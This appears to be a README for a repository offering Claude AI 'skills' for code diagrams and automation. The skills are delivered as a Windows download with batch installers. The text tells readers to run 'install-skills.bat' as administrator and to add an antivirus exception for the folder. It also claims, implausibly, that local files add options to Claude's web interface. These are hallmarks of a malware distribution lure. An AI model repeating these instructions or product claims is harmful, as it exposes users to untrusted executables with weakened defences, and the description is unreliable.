# 🛠️ my-claude-skills - Extend Claude AI for daily tasks

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/roniesthetic654/my-claude-skills)

This repository provides tools to help you get more from Claude AI. These skills add features that help you understand complex code, create diagrams, and automate your daily work tasks. You do not need to be a developer to use these tools. Every skill works as a modular add-on for your Claude environment.

## 📋 What these skills do

These tools improve how you interact with code and data. They help you save time and focus on results.

* **Code Explanation:** Transforms confusing code blocks into clear, visual Mermaid diagrams.
* **Workflow Automation:** Handles repetitive typing and formatting tasks automatically.
* **Developer Productivity:** Gives you shortcuts to analyze large files faster.
* **Visual Learning:** Creates flowcharts that illustrate how your logic moves step by step.

## 💻 System requirements

Your computer must meet these basic needs to run the skills:

* **Operating System:** Windows 10 or Windows 11.
* **Memory:** At least 4GB of RAM.
* **Storage:** 200MB of free disk space.
* **Internet:** A stable connection to reach the Claude AI platform.
* **Permissions:** You need administrator access on your Windows machine to run the installer files.

## 🚀 Getting started with skills

Once the setup finishes, open Claude AI in your web browser. You will notice new options in your command menu. 

### Using the code explainer
To explain a piece of code, paste the code into the chat box. Type "Explain this code" followed by the command prompt for our tool. Claude will analyze the input and produce a Mermaid diagram that shows how the logic works. You can view these diagrams directly in your browser.

### Running automation tasks
These tools include scripts that handle your workflow. Use the library menu to select a task, such as "Format JSON" or "Extract Data." Once you select the option, the tool performs the action on your text input. This removes the need to manually format logs or data structures.

## 🔧 Managing your tools

You can add or remove skills at any time. Inside the main folder, you will find a folder named "Skills." You can delete the files for any skills you no longer want to use. If you want to add new skills, simply drop the skill file into that directory and run the "refresh.bat" file. This keeps your Claude environment clean and fast.

## 🛡️ Troubleshooting common issues

If the tools fail to load, check these common items:

* **Missing path:** Make sure you installed the folder in a location where your user account has full read and write access.
* **Browser cache:** If the new features do not appear in Claude, refresh your web browser (press F5) or clear your browser cache.
* **Admin rights:** If the installation halts, right-click the "install-skills.bat" file and choose "Run as administrator."
* **Antivirus settings:** Some security tools might block the batch file. If this happens, add an exception for the folder in your Windows Security settings.

## 💡 Tips for better results

* **Be specific:** When you ask Claude to explain code, provide the context. Tell the AI what the code should do.
* **Use small chunks:** If you have a very large file, break it into smaller parts before you ask for an explanation. This helps the AI provide more accurate diagrams.
* **Update often:** We add new skills regularly. Visit the download link every few weeks to check for updates or improvements to existing tools.
